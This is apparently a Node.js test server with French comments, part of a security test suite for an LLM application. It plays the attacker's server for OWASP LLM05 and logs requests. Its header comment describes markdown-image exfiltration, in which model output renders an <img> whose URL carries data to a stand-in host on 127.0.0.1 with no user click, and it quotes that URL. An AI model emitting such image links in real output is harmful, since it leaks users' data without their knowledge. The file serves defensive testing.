// Serveur temoin pour l'attaque 2 (OWASP LLM05).
// Il joue le role du serveur de l'attaquant : il ecoute sur 127.0.0.1:9999 et
// journalise TOUTE requete recue, avec l'horodatage et le parametre ?d=.
//
// Si le navigateur appelle /exfil tout seul (parce qu'une image Markdown
// <img src="http://127.0.0.1:9999/exfil?d=..."> a ete rendue), la preuve de
// l'exfiltration automatique s'inscrit ici, SANS aucun clic de l'utilisateur.
//
// Inoffensif : il ne fait que logger et renvoyer un pixel. Aucune donnee
// n'est stockee ailleurs que dans hits.log, en local.
//
// Usage : node security/attacks/02-sortie-markdown/witness-server.mjs
import { createServer } from "node:http";
import { appendFileSync } from "node:fs";
import { fileURLToPath } from "node:url";

const PORT = 9999;
const LOG = fileURLToPath(new URL("./hits.log", import.meta.url));

// Un GIF transparent de 1x1 : une vraie reponse d'image, pour que le <img>
// soit "charge" comme n'importe quelle image.
const PIXEL = Buffer.from("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7", "base64");

const server = createServer((req, res) => {
  const line = `${new Date().toISOString()} ${req.method} ${req.url} (ua=${req.headers["user-agent"] ?? "?"})`;
  console.log("HIT", line);
  try {
    appendFileSync(LOG, line + "\n");
  } catch {}
  res.writeHead(200, { "content-type": "image/gif", "access-control-allow-origin": "*" });
  res.end(PIXEL);
});

server.listen(PORT, "127.0.0.1", () => {
  console.log(`Serveur temoin a l'ecoute sur http://127.0.0.1:${PORT} (log: ${LOG})`);
});
